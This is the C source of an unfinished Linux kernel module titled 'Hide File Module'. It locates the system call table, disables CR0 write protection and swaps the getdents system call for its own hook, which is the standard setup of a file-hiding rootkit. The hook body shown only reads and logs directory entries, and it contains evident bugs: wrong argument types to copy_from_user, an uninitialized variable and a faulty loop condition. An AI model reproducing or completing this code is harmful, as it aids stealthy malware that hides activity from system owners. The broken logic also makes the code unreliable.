#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>



MODULE_LICENSE("GPL");
MODULE_AUTHOR("SourceCodeDeleted");
MODULE_DESCRIPTION("Hide File Module");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;



void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 



//define our origional function. 

/*
int getdents(unsigned int fd,   struct linux_dirent   *dirp,    unsigned int count);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp,    unsigned int count);
*/

//struct linux_dirent {
//               unsigned long  d_ino;     /* Inode number */
//               unsigned long  d_off;     /* Offset to next linux_dirent */
//               unsigned short d_reclen;  /* Length of this linux_dirent */
//               char           d_name[];  /* Filename (null-terminated) */
                                 /* length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name)) */
               /*
               char           pad;       // Zero padding byte
               char           d_type;    // File type (only since Linux
                                         // 2.6.4); offset is (d_reclen - 1)
               */
//           }

struct linux_dirent {
	unsigned long	d_ino;    /* Inode number */
	unsigned long	d_off;	  /* Offset to next linux_dirent */
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		    d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};




asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

//Create Our version of Open Function. 
asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

	
	char letter ;
	int i = 0;
	char  directory[255];
	int doff = 0 ;
	//int ret = original_getdents(fd, dirp, count);
	//void * CopyOfStuff = kzalloc(1024, GFP_KERNEL);

	copy_from_user(doff, dirp->d_off, 1);

	while (letter != 0 || i < 6){ 
	get_user(letter, dirp->d_name+i);
	get_user(letter, dirp->d_name+i);
	directory[i] = letter ;
	i++;
	}

	printk(KERN_INFO "FILE Found %x ", doff);  


	return (*original_getdents)(fd, dirp, count); 
}





// Set up hooks.
static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
	EnablePageWriting();

  // Replaces Pointer Of Syscall_open on our syscall.
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting();

	return 0;
}







static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	DisablePageWriting();

	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);


